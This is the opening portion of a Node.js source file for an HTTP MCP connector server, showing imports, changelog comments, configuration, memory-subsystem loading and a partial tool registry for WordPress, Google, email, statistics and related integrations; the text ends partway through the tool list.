// src/server-http.js  v12.24.0
// HTTP MCP server for browser-based Claude (claude.ai) and Railway deployment.
//
// v12.4.0: Add skill_recompile MCP tool. Mid-session delta recompile: runs the
// full 6-layer dispatcher for a new topic query and returns only the modules
// not already loaded in the current session (the delta). Solves the context-shift
// problem documented in DC2026 session 2026-06-09: when a conversation topic
// changes significantly, skill_compile cannot be re-run (session-start only) and
// skill_load_specialist requires knowing the exact module ID. skill_recompile
// accepts the new query, runs the dispatcher, and returns only the additional
// content needed — keeping output small and avoiding duplication of content
// already in the append-only context window.
//
// AVA_MEMORY_WP_KEY are set, all six memory_* tools read and write directly
// to MySQL via the WordPress REST API. No Railway SQLite layer is involved.
// The ava_memory_backup and ava_memory_restore tools return informational
// no-op responses in MySQL-primary mode; ava_memory_sync_status returns live
// MySQL health stats instead of a SQLite vs MySQL comparison.
//
// v10.0.0 (major release): Integrates the TrueSource Persistent Memory MCP
// (six memory_* tools) directly into the connector. Memory storage uses
// SQLite + FTS5 on the Railway persistent volume mounted at /data. The
// memory subsystem is gated by AVA_MEMORY_WP_URL+AVA_MEMORY_WP_KEY (MySQL-primary)
// or MEMORY_AUTH_TOKEN (SQLite fallback). When neither is configured, the six memory
// tools are advertised and routed; when unset, those tools are omitted from
// the tool list and the rest of the connector continues to function unchanged.
//
// v9.0.0: Consolidated former stats-connector (data-analysis) into
// claude-connector. All previous claude-connector v8.0.0 capabilities are
// preserved. Adds 35 statistical / machine-learning tools (data_*, stats_*,
// ts_*, ml_*, plus stats_help). Express body limit raised to 50mb to support
// inline-data dataset loading.
//
// v7.0 CHANGES (TrueSource Outreach Direct Send):
//   - SCOPE-01 Tools: email_send, email_get_config, email_get_sender_profiles, email_validate_address
//   - SCOPE-03 HTML email templating integrated into email_send
//   - SCOPE-04 Tracking endpoints: GET /track/open, GET /track/click
//              + tools: email_get_tracking, email_tracking_summary
//   - SCOPE-05 Scheduling: cron-driven in-process scheduler started at boot
//              + tools: email_schedule, email_schedule_cancel, email_schedule_list
// -----------------------------------------------------------------------
// GET /api/config.js — connector self-discovery
// Returns a tiny JS snippet that sets window.__TI_CONFIG with the
// connector's public URL, derived from Railway's RAILWAY_PUBLIC_DOMAIN.
// The Tenax chat HTML loads this as <script src="/api/config.js"></script>
// so the frontend always knows where to POST files, regardless of deployment.
// -----------------------------------------------------------------------


import "dotenv/config";
// v12.0.0: Tenant authentication middleware
import { tenantAuthMiddleware, logTenantModeStatus, isTenantMode } from './middleware/tenantAuth.js';
// v12.28.0 (TNX-C-001): connector-wide fail-closed authentication gate.
import {
  assertConfigured        as assertMcpAuthConfigured,
  mcpAuthMiddleware,
  assertAllRoutesCovered,
  describeAllowlist       as describeAuthAllowlist,
}                                                                  from './middleware/mcpAuth.js';
// v12.28.0 (TNX-C-005 / TNX-C-010): boundary-correct path containment.
import { resolveContained, isSafeFilename }                        from './utils/pathContainment.js';
// v12.37.0: internal configuration bridge (GET|POST /internal/config/env).
import { createInternalConfigHandler }                             from './utils/internalConfig.js';
// TNX-FEAT-SIGNEDURLS: per-file HMAC signed download links.
import { verifySignedRequest, signedLinksEnabled, resolveSigningSecret, linkExpirySeconds } from './utils/signedUrls.js';
// v12.28.0 (TNX-H-004 / TNX-H-006): process guards, HTTP timeout tuning,
// graceful drain and readiness checks. The connector previously had none of
// these; the gateway had all of them.
import {
  installProcessGuards,
  applyServerTimeouts,
  installShutdownHandlers,
  runReadinessChecks,
  isShuttingDown,
  uptimeSeconds,
}                                                                  from './utils/serviceRuntime.js';
import { initDevice }                                               from './utils/deviceId.js';
import { registerProvisionRoute } from './routes/provision.js';
// v12.3.0: Tenant session init tool
import {
  tsGatewaySessionInitToolDefinition,
  handleTsGatewaySessionInit,
} from './tools/gatewaySessionInit.js';

// v12.40.0: Tenax UI Tools - Personal Chef and My Weight Loss Coach research briefs.
// These build the recipe-scout brief; they do not perform the research themselves.
// See the header of src/tools/personalChef.js for why.
import {
  personalChefFindToolDefinition,
  weightLossAdaptToolDefinition,
  handlePersonalChefFind,
  handleWeightLossAdapt,
} from "./tools/personalChef.js";

// v12.5.0: Peer Review - health log tools (tenant mode) and check-in tools (owner mode)
import {
  healthLogWriteToolDefinition,
  issueFlagToolDefinition,
  peerReviewConsentToolDefinition,
  handleHealthLogWrite,
  handleIssueFlag,
  handlePeerReviewConsent,
} from './tools/healthLog.js';
// TENAX-FEAT-DIFF-001: post-session knowledge-graph extraction + quality scoring.
import {
  knowledgeGraphExtractToolDefinition,
  handleKnowledgeGraphExtract,
} from './tools/knowledgeGraph.js';
import {
  qualityScoreSubmitToolDefinition,
  handleQualityScoreSubmit,
} from './tools/qualityScore.js';
import {
  clientRegistryUpdateToolDefinition,
  clientCheckinToolDefinition,
  escalationQueueReadToolDefinition,
  handleClientRegistryUpdate,
  handleClientCheckin,
  handleEscalationQueueRead,
} from './tools/clientCheckin.js';
import { createServer } from "http";
// v12.28.0 (TNX-C-010): execSync invokes /bin/sh -c and was being handed an
// interpolated, caller-controlled filename. Replaced throughout by
// execFileSync, which passes an argument array directly to execve and never
// involves a shell, eliminating the command-injection class outright.
import { execFileSync } from "child_process";
import { registerExportRoute } from './routes/export.js';
// v12.22.0: pre/post deployment volume snapshot and restore endpoints.
import { registerVolumeSnapshotRoutes } from './routes/volume-snapshot.js';
import express from "express";
// v12.28.0 (TNX-C-001): express-rate-limit was a declared but unused dependency.
import rateLimit from "express-rate-limit";
// v12.28.0 (TNX-M-021): security headers and response compression. Neither Node
// service set any security headers at all.
import helmet from "helmet";
import compression from "compression";
import { randomUUID, createHash, timingSafeEqual } from "node:crypto";
import { readFileSync, writeFileSync, existsSync, mkdirSync, readdirSync, statSync, unlinkSync } from "fs";
import { dirname, join as pathJoin, basename, extname, resolve as pathResolve } from "path";

import { Server } from "@modelcontextprotocol/sdk/server/index.js";
import { StreamableHTTPServerTransport } from "@modelcontextprotocol/sdk/server/streamableHttp.js";
import { SSEServerTransport } from "@modelcontextprotocol/sdk/server/sse.js";
import { isInitializeRequest, CallToolRequestSchema, ListToolsRequestSchema } from "@modelcontextprotocol/sdk/types.js";

import { webSearchToolDefinition, handleWebSearch } from "./tools/webSearch.js";
import { newsSearchToolDefinition, handleNewsSearch } from "./tools/newsSearch.js";
import { imageSearchToolDefinition, handleImageSearch } from "./tools/imageSearch.js";
import {
  linkedinLoadToolDefinition, linkedinSearchToolDefinition,
  linkedinCountToolDefinition, linkedinProfileToolDefinition,
  handleLinkedinLoad, handleLinkedinSearch,
  handleLinkedinCount, handleLinkedinProfile,
} from "./tools/linkedin.js";
import {
  linkedinOAuthStartToolDefinition, linkedinOAuthStatusToolDefinition,
  linkedinOAuthLogoutToolDefinition, linkedinLiveProfileToolDefinition,
  handleLinkedinOAuthStart, handleLinkedinOAuthStatus,
  handleLinkedinOAuthLogout, handleLinkedinLiveProfile,
} from "./tools/linkedinOAuth.js";

import {
  wpSiteInfoToolDefinition,
  wpListPostsToolDefinition,
  wpListPagesToolDefinition,
  wpListCategoriesToolDefinition,
  wpListTagsToolDefinition,
  wpCreateCategoryToolDefinition,
  wpCreateTagsToolDefinition,
  wpListMenusToolDefinition,
  wpListMenuItemsToolDefinition,
  wpCreatePostToolDefinition,
  wpCreatePageToolDefinition,
  wpAddMenuItemToolDefinition,
  wpUpdateContentToolDefinition,
  handleWpSiteInfo,
  handleWpListPosts,
  handleWpListPages,
  handleWpListCategories,
  handleWpListTags,
  handleWpCreateCategory,
  handleWpCreateTags,
  handleWpListMenus,
  handleWpListMenuItems,
  handleWpCreatePost,
  handleWpCreatePage,
  handleWpAddMenuItem,
  handleWpUpdateContent,
} from "./tools/wordpress.js";

import {
  setWordPressCredentialsToolDefinition,
  getWordPressCredentialsToolDefinition,
  clearWordPressCredentialsToolDefinition,
  setLinkedInCredentialsToolDefinition,
  getLinkedInCredentialsToolDefinition,
  clearLinkedInCredentialsToolDefinition,
  handleSetWordPressCredentials,
  handleGetWordPressCredentials,
  handleClearWordPressCredentials,
  handleSetLinkedInCredentials,
  handleGetLinkedInCredentials,
  handleClearLinkedInCredentials,
} from "./tools/credentials.js";

import {
  wpSetSeoMetaToolDefinition,
  wpCreateServicePageToolDefinition,
  handleWpSetSeoMeta,
  handleWpCreateServicePage,
} from "./tools/marketPublisher.js";

import {
  imageDownloadToolDefinition,
  imageSearchDownloadToolDefinition,
  handleImageDownload,
  handleImageSearchDownload,
} from "./tools/imageDownloader.js";
import {
  wpUploadMediaToolDefinition,
  wpSetFeaturedImageToolDefinition,
  handleWpUploadMedia,
  handleWpSetFeaturedImage,
} from "./tools/wordpressMedia.js";
import {
  googleDriveListToolDefinition,
  handleGoogleDriveList,
  googleDriveCheckConnectionToolDefinition,
  googleDriveSearchFilesToolDefinition,
  googleDriveReadFileContentToolDefinition,
  googleDriveDownloadFileContentToolDefinition,
  googleDriveCreateFileToolDefinition,
  googleDriveGetFileMetadataToolDefinition,
  googleDriveListRecentFilesToolDefinition,
  googleDriveGetFilePermissionsToolDefinition,
  handleGoogleDriveCheckConnection,
  handleGoogleDriveSearchFiles,
  handleGoogleDriveReadFileContent,
  handleGoogleDriveDownloadFileContent,
  handleGoogleDriveCreateFile,
  handleGoogleDriveGetFileMetadata,
  handleGoogleDriveListRecentFiles,
  handleGoogleDriveGetFilePermissions,
} from "./tools/googleDrive.js";

import {
  psychologyEmotionTaxonomyToolDefinition,
  psychologySentimentAnalyzeToolDefinition,
  psychologyAlignmentAssessToolDefinition,
  handlePsychologyEmotionTaxonomy,
  handlePsychologySentimentAnalyze,
  handlePsychologyAlignmentAssess,
} from "./tools/psychology.js";

// Self-Model Interrogation (Phase 1)
import {
  selfModelQueryToolDefinition,
  handleSelfModelQuery,
} from "./tools/selfModelQuery.js";
import { selfModelRecordToolCall } from "./tools-self-model/hook.js";
import { initSelfModelDb, isSelfModelEnabled } from "./tools-self-model/db.js";

// Sustained Self Across Sessions (Phase 2)
import {
  selfStateWriteToolDefinition,
  handleSelfStateWrite,
  selfStateReadToolDefinition,
  handleSelfStateRead,
} from "./tools/selfState.js";

// Initiative and Background Awareness (Phase 3)
import {
  nudgeAnalyzeToolDefinition,
  handleNudgeAnalyze,
  nudgeCheckToolDefinition,
  handleNudgeCheck,
  nudgeActionToolDefinition,
  handleNudgeAction,
} from "./tools/nudgeTools.js";

// Socratic Tutor Mode (Phase 4)
import {
  studentModelObserveToolDefinition,
  handleStudentModelObserve,
  studentModelRelateToolDefinition,
  handleStudentModelRelate,
  socraticSeamQuestionToolDefinition,
  handleSocraticSeamQuestion,
  studentModelReadToolDefinition,
  handleStudentModelRead,
} from "./tools/socraticTools.js";

// Assessed Homework PDF Render (Phase 5b)
import {
  homeworkAssessRenderToolDefinition,
  handleHomeworkAssessRender,
} from "./tools/homeworkTools.js";

// ---------- TrueSource outreach direct send (SCOPE-01/03/04/05) ----------
import {
  emailSendToolDefinition,
  emailGetConfigToolDefinition,
  emailGetSenderProfilesToolDefinition,
  emailValidateAddressToolDefinition,
  handleEmailSend,
  handleEmailGetConfig,
  handleEmailGetSenderProfiles,
  handleEmailValidateAddress,
} from "./tools/email.js";

import {
  emailScheduleToolDefinition,
  emailScheduleCancelToolDefinition,
  emailScheduleListToolDefinition,
  handleEmailSchedule,
  handleEmailScheduleCancel,
  handleEmailScheduleList,
} from "./tools/emailSchedule.js";

// v8.0.0 additions
import {
  calendarListEventsToolDefinition,
  calendarCreateEventToolDefinition,
  calendarUpdateEventToolDefinition,
  calendarDeleteEventToolDefinition,
  handleCalendarListEvents,
  handleCalendarCreateEvent,
  handleCalendarUpdateEvent,
  handleCalendarDeleteEvent,
} from "./tools/googleCalendar.js";

import {
  sheetsGetMetadataToolDefinition,
  sheetsReadRangeToolDefinition,
  sheetsWriteRangeToolDefinition,
  sheetsAppendRowsToolDefinition,
  handleSheetsGetMetadata,
  handleSheetsReadRange,
  handleSheetsWriteRange,
  handleSheetsAppendRows,
} from "./tools/googleSheets.js";

import {
  webhookPollEventsToolDefinition,
  webhookClearEventsToolDefinition,
  webhookQueueStatusToolDefinition,
  enqueueWebhookEvent,
  validateWebhookSecret,
  handleWebhookPollEvents,
  handleWebhookClearEvents,
  handleWebhookQueueStatus,
} from "./tools/webhook.js";

import {
  slackSendMessageToolDefinition,
  teamsSendMessageToolDefinition,
  handleSlackSendMessage,
  handleTeamsSendMessage,
} from "./tools/messaging.js";

import {
  webFetchPageToolDefinition,
  handleWebFetchPage,
} from "./tools/webFetch.js";

import {
  googleDriveOverwriteFileToolDefinition,
  handleGoogleDriveOverwriteFile,
} from "./tools/googleDrive.js";

import {
  wpGetContentToolDefinition,
  wpHealthToolDefinition,
  handleWpGetContent,
  handleWpHealth,
} from "./tools/wordpress.js";



// ---------- v10.0.0: Persistent Memory MCP integration ----------
// v10.0.1 fix: lazy-load the memory subsystem. The tools-memory/index.js
// chain transitively imports better-sqlite3 (native module). On hosts that
// have not yet built that binary (or where the persistent volume is not
// provisioned), eager imports caused module-load failures that took the
// entire connector down - which manifested to users as 'WordPress REST API
// stopped working'. We now resolve the memory bindings on first use only
// when MEMORY_AUTH_TOKEN is configured.
let ALL_MEMORY_TOOL_DEFINITIONS = [];
let MEMORY_TOOL_NAMES = new Set();
let dispatchMemoryTool = null;
let initMemorySubsystem = null;
let getMemoryHealthSnapshot = () => ({ enabled: false });
let memoryAdminDumpHandler = null;

// ---------- v9.0.0: Statistical analysis & machine learning ----------
import {
  dataLoadToolDefinition, dataInfoToolDefinition, dataPreviewToolDefinition,
  dataListToolDefinition, dataDropToolDefinition, dataFilterToolDefinition,
  dataSelectToolDefinition, dataSampleToolDefinition,
  handleDataLoad, handleDataInfo, handleDataPreview, handleDataList,
  handleDataDrop, handleDataFilter, handleDataSelect, handleDataSample,
} from "./tools-stats/dataManagement.js";
import {
  describeToolDefinition, frequencyToolDefinition, histogramToolDefinition,
  crosstabToolDefinition, normalityToolDefinition,
  handleDescribe, handleFrequency, handleHistogram, handleCrosstab, handleNormality,
} from "./tools-stats/descriptiveStats.js";
import {
  tTestToolDefinition, anovaToolDefinition, chiSquareToolDefinition,
  confidenceIntervalToolDefinition, mannWhitneyToolDefinition, proportionTestToolDefinition,
  handleTTest, handleAnova, handleChiSquare,
  handleConfidenceInterval, handleMannWhitney, handleProportionTest,
} from "./tools-stats/inferentialStats.js";
import {
  correlationToolDefinition, regressionToolDefinition, partialCorrelationToolDefinition,
  handleCorrelation, handleRegression, handlePartialCorrelation,
} from "./tools-stats/regressionCorrelation.js";
import {
  timeSeriesAnalyzeToolDefinition, movingAverageToolDefinition, forecastToolDefinition,
  handleTimeSeriesAnalyze, handleMovingAverage, handleForecast,
} from "./tools-stats/timeSeries.js";
import {
  kmeansToolDefinition, pcaToolDefinition, knnToolDefinition,
  naiveBayesToolDefinition, anomalyDetectionToolDefinition, featureImportanceToolDefinition,
  handleKMeans, handlePCA, handleKNN,
  handleNaiveBayes, handleAnomalyDetection, handleFeatureImportance,
} from "./tools-stats/machineLearning.js";

import {
  PIXEL_PNG,
  appendTrackingEvent,
  classifyUserAgent,
  hashIp,
  getSendMetadata,
  incrementOpen,
} from "./utils/tracking.js";
import { startScheduler, flushScheduleStore } from "./utils/scheduler.js";
import { migrateLegacyCredentials, checkStorageLocation } from "./utils/credentialStore.js";

import { getCurrentDateTime } from "./utils/helpers.js";
import { log } from "./utils/logger.js";
// Neural Core (v12.10.0): keeps ava_brain_data.json current and records what
// each compile loaded. Observability only - it can never fail a tool call.
// v12.36.0: bootScanIfMissing is gone. It was the deployment-time scan trigger.
// describeScanState replaces the part of it that was worth keeping: reporting
// whether a scan exists, without spawning one to make it exist.
import {
  onToolCompleted as brainScanOnToolCompleted,
  runBrainScan,
  describeScanState,
  writeToolCatalog,
  getBrainScanPaths,
  setBrainScanLogger,
} from "./tools/brain-scan-trigger.js";
import { validateAndConsumeState, storeToken } from "./utils/tokenStore.js";
import { getLinkedInCredentials } from "./utils/credentialStore.js";
import { config } from "./config.js";
import {
  skillReadToolDefinition,
  skillWriteToolDefinition,
  skillWriteAdditionToolDefinition,
  skillMergeAdditionsToolDefinition,
  skillHistoryToolDefinition,
  skillRollbackToolDefinition,
  skillAuditToolDefinition,
  handleSkillRead,
  handleSkillWrite,
  handleSkillWriteAddition,
  handleSkillMergeAdditions,
  handleSkillHistory,
  handleSkillRollback,
  handleSkillRestoreFromWp,
  handleSkillAudit,
} from "./tools/skill.js";
import {
  booksReadToolDefinition,
  booksLogWriteToolDefinition,
  handleBooksRead,
  handleBooksLogWrite,
  handleBooksRestoreFromWp,
} from "./tools/books.js";
import {
  profileReadToolDefinition,
  profileWritePersonToolDefinition,
  handleProfileRead,
  handleProfileWritePerson,
  handleProfilesRestoreFromWp,
} from "./tools/profiles.js";
import {
  skillCompileToolDefinition,
  skillLoadSpecialistToolDefinition,
  skillRecompileToolDefinition,
  personalityWriteToolDefinition,
  dispatchRuleAddToolDefinition,
  handleSkillCompile,
  handleSkillLoadSpecialist,
  handleSkillRecompile,
  handlePersonalityWrite,
  handleDispatchRuleAdd,
  handleModulesRestoreFromWp,
} from "./tools/skill-modular.js";
import {
  avaMemoryBackupToolDefinition,
  avaMemoryRestoreToolDefinition,
  avaMemorySyncStatusToolDefinition,
  handleAvaMemoryBackup,
  handleAvaMemoryRestore,
  handleAvaMemorySyncStatus,
} from "./tools/avaMemorySync.js";
import {
  moduleWriteToolDefinition,
  archiveListToolDefinition,
  archiveReadToolDefinition,
  archiveWriteToolDefinition,
  referenceListToolDefinition,
  referenceReadToolDefinition,
  referenceWriteToolDefinition,
  scriptListToolDefinition,
  scriptReadToolDefinition,
  scriptWriteToolDefinition,
  handleModuleWrite,
  handleArchiveList,
  handleArchiveRead,
  handleArchiveWrite,
  handleReferenceList,
  handleReferenceRead,
  handleReferenceWrite,
  handleScriptList,
  handleScriptRead,
  handleScriptWrite,
  handleArchiveRestoreFromWp,
  handleReferenceRestoreFromWp,
  handleScriptRestoreFromWp,
} from "./tools/skill-content.js";
import {
  handleScriptExecute,
  TOOL_DEFINITION as scriptExecuteToolDefinition,
} from "./tools/script-execute.js";

const PORT = parseInt(process.env.PORT || "3000", 10);
const HOST = process.env.HOST || "0.0.0.0";
const UPLOAD_API_KEY = process.env.UPLOAD_API_KEY || "";
// Restore token gates POST /restore-skill (push-from-WordPress back to Railway volume).
// Must match RAILWAY_RESTORE_TOKEN configured in the ts-ava-skill WordPress plugin Settings tab.
const RAILWAY_RESTORE_TOKEN = process.env.RAILWAY_RESTORE_TOKEN || "";
// Document download token - lighter weight token used by the download and
// preview endpoints so the UI can hardcode it into URLs without exposing
// the primary RAILWAY_RESTORE_TOKEN.
const DOCUMENT_DOWNLOAD_TOKEN = process.env.DOCUMENT_DOWNLOAD_TOKEN || "";
// Memory is enabled when either MySQL-primary (WP) or SQLite (legacy) is configured.
const MEMORY_AUTH_TOKEN = process.env.MEMORY_AUTH_TOKEN || "";
let MEMORY_ENABLED = Boolean(MEMORY_AUTH_TOKEN) || Boolean(config.avaMemoryWpUrl && config.avaMemoryWpKey);

// Skill tools are enabled when SKILL_FILE_PATH is explicitly set in Railway Variables.
// The default paths resolve to /data/skill/ but tools are only advertised when the
// operator has provisioned the volume and set the env var.
const SKILL_ENABLED = Boolean(config.skillFilePath);
// Modular skill system - activated by SKILL_MODULAR_ENABLED=true AND SKILL_FILE_PATH set.
const SKILL_MODULAR_ENABLED = SKILL_ENABLED && process.env.SKILL_MODULAR_ENABLED === "true";

// ---------------------------------------------------------------------------
// Runtime modular mode helpers (v11.3.0)
//
// SKILL_MODULAR_ENABLED (above) reflects the env var at startup time only.
// isModularEnabled() checks a mode file on the Railway volume first, allowing
// WordPress to toggle the mode without a redeploy. The mode file takes
// precedence over the env var when present.
//
// Mode file path: {SKILL_FILE_PATH_base}/.modular_mode  (default: /data/skill/.modular_mode)
// File content: the string "true" or "false".
// ---------------------------------------------------------------------------

function getModeFilePath() {
  const skillPath = process.env.SKILL_FILE_PATH || "/data/skill/SKILL.md";
  return skillPath.replace(/SKILL\.md$/, "") + ".modular_mode";
}

function isModularEnabled() {
  if (!SKILL_ENABLED) return false;
  const modePath = getModeFilePath();
  if (existsSync(modePath)) {
    try {
      const val = readFileSync(modePath, "utf8").trim();
      return val === "true";
    } catch { /* fall through to env var */ }
  }
  return process.env.SKILL_MODULAR_ENABLED === "true";
}

function getModularModeStatus() {
  const modePath = getModeFilePath();
  const hasFile  = existsSync(modePath);
  let fileValue  = null;
  if (hasFile) {
    try { fileValue = readFileSync(modePath, "utf8").trim(); } catch { /* ignore */ }
  }
  const envVar  = process.env.SKILL_MODULAR_ENABLED || "not set";
  const enabled = isModularEnabled();
  return {
    enabled,
    source:          hasFile ? "mode_file" : "env_var",
    env_var:         envVar,
    file_value:      fileValue,
    mode_file_path:  modePath,
    note:            hasFile
      ? "Mode file present — overrides SKILL_MODULAR_ENABLED env var. Delete the file to revert to env var control."
      : "No mode file. Using SKILL_MODULAR_ENABLED env var (requires redeploy to change).",
  };
}

// Profiles tools are enabled when SKILL_FILE_PATH is set (they share the same volume).
// Can also be enabled independently via PROFILES_FILE_PATH.
const PROFILES_ENABLED = Boolean(config.skillFilePath) || Boolean(process.env.PROFILES_FILE_PATH);

// ---------------------------------------------------------------------------
// Personal-file WordPress Gateway backup (v12.1.0)
//
// When running in tenant mode (TS_CLIENT_MODE=tenant), personality_write,
// profile_write_person, and dispatch_rule_add call backupPersonalFileToGateway()
// after each successful write so that the WordPress Client Gateway always holds
// a current copy for disaster recovery.
//
// No new env vars needed: TS_TENANT_GATEWAY_URL and TS_CLIENT_API_KEY are
// already required for tenant mode authentication (tenantAuth.js).
// ---------------------------------------------------------------------------

// Base directory of the skill volume (e.g. /data/skill/ava).
// Derived from SKILL_FILE_PATH (/data/skill/ava/SKILL.md) via dirname().
const SKILL_BASE_DIR = SKILL_ENABLED ? dirname(config.skillFilePath) : null;

// Tenant gateway URL and API key (already set as env vars in tenant mode).
const TENANT_GATEWAY_URL = (process.env.TS_TENANT_GATEWAY_URL || "").replace(/\/$/, "");
const TENANT_API_KEY     = process.env.TS_CLIENT_API_KEY || "";

/**
 * Back up a personal file to the WordPress Client Gateway after it has been
 * updated on the Railway volume. Only runs in tenant mode with a gateway URL
 * and API key configured. Non-blocking: failures are logged but never surface
 * to the caller or affect the tool result.
 *
 * @param {'PERSONALITY.md'|'PROFILES.md'|'DISPATCH_RULES.json'} fileKey
 * @param {string} filePath  Absolute path to the file on the Railway volume.
 */
async function backupPersonalFileToGateway(fileKey, filePath) {
  if (!isTenantMode() || !TENANT_GATEWAY_URL || !TENANT_API_KEY) return;

  let content;
  try {
    content = readFileSync(filePath, "utf8");
  } catch (readErr) {
    log("warn", `[wp-backup] Cannot read ${fileKey} for gateway backup: ${readErr.message}`);
    return;
  }

  if (!content || !content.trim()) return;

  const backupUrl = `${TENANT_GATEWAY_URL}/backup/personal`;
  try {
    const resp = await fetch(backupUrl, {
      method:  "POST",
      headers: {
        "Content-Type": "application/json",
        "User-Agent":   "claude-connector/12.8.0 (TrueSource tenant mode)",
      },
      body:   JSON.stringify({ api_key: TENANT_API_KEY, file_key: fileKey, content }),
      signal: AbortSignal.timeout(10_000),
    });
    if (resp.ok) {
      log("info", `[wp-backup] ${fileKey} backed up to WordPress gateway (tenant: ${process.env.TS_TENANT_ID || "unknown"})`);
    } else {
      const errSnippet = (await resp.text().catch(() => "")).slice(0, 200);
      log("warn", `[wp-backup] ${fileKey} gateway backup HTTP ${resp.status}: ${errSnippet}`);
    }
  } catch (fetchErr) {
    log("warn", `[wp-backup] ${fileKey} gateway backup fetch failed: ${fetchErr.message}`);
  }
}

// Initialise the persistent memory subsystem when configured.
// v10.0.1: dynamic import keeps the rest of the connector functional even
// when better-sqlite3 fails to load (missing native binary, etc.).
if (MEMORY_ENABLED) {
  try {
    const memMod = await import("./tools-memory/index.js");
    const adminMod = await import("./tools-memory/admin.js");
    ALL_MEMORY_TOOL_DEFINITIONS = memMod.ALL_MEMORY_TOOL_DEFINITIONS;
    MEMORY_TOOL_NAMES = memMod.MEMORY_TOOL_NAMES;
    dispatchMemoryTool = memMod.dispatchMemoryTool;
    initMemorySubsystem = memMod.initMemorySubsystem;
    getMemoryHealthSnapshot = async () => memMod.getMemoryHealthSnapshot();
    memoryAdminDumpHandler = adminMod.adminDumpHandler;
    await initMemorySubsystem();
    log("info", "[memory] subsystem ENABLED");
  } catch (err) {
    MEMORY_ENABLED = false;
    log("error", `[memory] subsystem failed to initialise: ${err.message}. Continuing with memory disabled; all other tools (including WordPress REST) remain available.`);
  }
} else {
  log(
    "info",
    "[memory] memory_* tools disabled. Set AVA_MEMORY_WP_URL+AVA_MEMORY_WP_KEY (MySQL-primary) " +
      "or MEMORY_AUTH_TOKEN (SQLite) in Railway Variables to enable.",
  );
}

// -----------------------------------------------------------------------
// Tool registry
// -----------------------------------------------------------------------
const TOOLS = [
  // ---------- Tenax UI Tools: Personal Chef / Weight Loss Coach (v12.40.0) ----------
  // Advertised unconditionally: both are plain request/response brief builders
  // with no gateway credentials, no filesystem writes and no tenant coupling,
  // so there is nothing for a mode guard to protect. They are also reachable
  // from chat with no UI at all, which spec 8 explicitly requires.
  personalChefFindToolDefinition,
  weightLossAdaptToolDefinition,

  // ---------- TrueSource Client Gateway session init (v12.3.0) ----------
  // Only advertised when TS_CLIENT_MODE=tenant. Authenticates the session
  // and returns the required next-step sequence including skill_compile.
  ...(isTenantMode() ? [tsGatewaySessionInitToolDefinition] : []),

  // ---------- Peer Review: health log tools (v12.5.0) ----------
  // health_log_write and issue_flag: tenant mode only (called by client Ava).
  // peer_review_consent_set: tenant mode only (first session consent dialogue).
  ...(isTenantMode() ? [
    healthLogWriteToolDefinition,
    issueFlagToolDefinition,
    peerReviewConsentToolDefinition,
    // Post-session extraction + scoring (called at session close, after memory_write).
    knowledgeGraphExtractToolDefinition,
    qualityScoreSubmitToolDefinition,
  ] : []),

  // ---------- Peer Review: check-in tools (v12.5.0) ----------
  // client_checkin, client_registry_update, escalation_queue_read: owner mode only.
  ...(!isTenantMode() ? [
    clientRegistryUpdateToolDefinition,
    clientCheckinToolDefinition,
    escalationQueueReadToolDefinition,
  ] : []),

  webSearchToolDefinition,
  newsSearchToolDefinition,
  imageSearchToolDefinition,
  linkedinLoadToolDefinition,
  linkedinSearchToolDefinition,
  linkedinCountToolDefinition,
  linkedinProfileToolDefinition,
  linkedinOAuthStartToolDefinition,
  linkedinOAuthStatusToolDefinition,
  linkedinOAuthLogoutToolDefinition,
  linkedinLiveProfileToolDefinition,
  setWordPressCredentialsToolDefinition,
  getWordPressCredentialsToolDefinition,
  clearWordPressCredentialsToolDefinition,
  setLinkedInCredentialsToolDefinition,
  getLinkedInCredentialsToolDefinition,
  clearLinkedInCredentialsToolDefinition,
  wpSiteInfoToolDefinition,
  wpListPostsToolDefinition,
  wpListPagesToolDefinition,
  wpListCategoriesToolDefinition,
  wpListTagsToolDefinition,
  wpCreateCategoryToolDefinition,
  wpCreateTagsToolDefinition,
  wpListMenusToolDefinition,
  wpListMenuItemsToolDefinition,
  wpCreatePostToolDefinition,
  wpCreatePageToolDefinition,
  wpAddMenuItemToolDefinition,
  wpUpdateContentToolDefinition,
  wpSetSeoMetaToolDefinition,
  wpCreateServicePageToolDefinition,
  imageDownloadToolDefinition,
  imageSearchDownloadToolDefinition,
  wpUploadMediaToolDefinition,
  wpSetFeaturedImageToolDefinition,
  googleDriveListToolDefinition,
  googleDriveCheckConnectionToolDefinition,
  googleDriveSearchFilesToolDefinition,
  googleDriveReadFileContentToolDefinition,
  googleDriveDownloadFileContentToolDefinition,
  googleDriveCreateFileToolDefinition,
  googleDriveOverwriteFileToolDefinition,
  googleDriveGetFileMetadataToolDefinition,
  googleDriveListRecentFilesToolDefinition,
  googleDriveGetFilePermissionsToolDefinition,
  psychologyEmotionTaxonomyToolDefinition,
  psychologySentimentAnalyzeToolDefinition,
  psychologyAlignmentAssessToolDefinition,

  // ---------- Self-Model Interrogation (Phase 1) ----------
  selfModelQueryToolDefinition,

  // ---------- Sustained Self Across Sessions (Phase 2) ----------
  selfStateWriteToolDefinition,
  selfStateReadToolDefinition,

  // ---------- Initiative and Background Awareness (Phase 3) ----------
  nudgeAnalyzeToolDefinition,
  nudgeCheckToolDefinition,
  nudgeActionToolDefinition,

  // ---------- Socratic Tutor Mode (Phase 4) ----------
  studentModelObserveToolDefinition,
  studentModelRelateToolDefinition,
  socraticSeamQuestionToolDefinition,
  studentModelReadToolDefinition,

  // ---------- Assessed Homework PDF Render (Phase 5b) ----------
  homeworkAssessRenderToolDefinition,

  // ---------- TrueSource outreach direct send ----------
  emailSendToolDefinition,
  emailGetConfigToolDefinition,
  emailGetSenderProfilesToolDefinition,
  emailValidateAddressToolDefinition,
  emailScheduleToolDefinition,
  emailScheduleCancelToolDefinition,
  emailScheduleListToolDefinition,

  // ---------- WordPress get content ----------
  wpGetContentToolDefinition,
  wpHealthToolDefinition,

  // ---------- Google Calendar (v8.0.0) ----------
  calendarListEventsToolDefinition,
  calendarCreateEventToolDefinition,
  calendarUpdateEventToolDefinition,
  calendarDeleteEventToolDefinition,

  // ---------- Google Sheets (v8.0.0) ----------
  sheetsGetMetadataToolDefinition,
  sheetsReadRangeToolDefinition,
  sheetsWriteRangeToolDefinition,
  sheetsAppendRowsToolDefinition,

  // ---------- Inbound Webhook (v8.0.0) ----------
  webhookPollEventsToolDefinition,
  webhookClearEventsToolDefinition,
  webhookQueueStatusToolDefinition,

  // ---------- Slack / Teams messaging (v8.0.0) ----------
  slackSendMessageToolDefinition,
  teamsSendMessageToolDefinition,

  // ---------- Full page web fetch (v8.0.0) ----------
  webFetchPageToolDefinition,

  // ---------- Statistical analysis & ML (v9.0.0) ----------
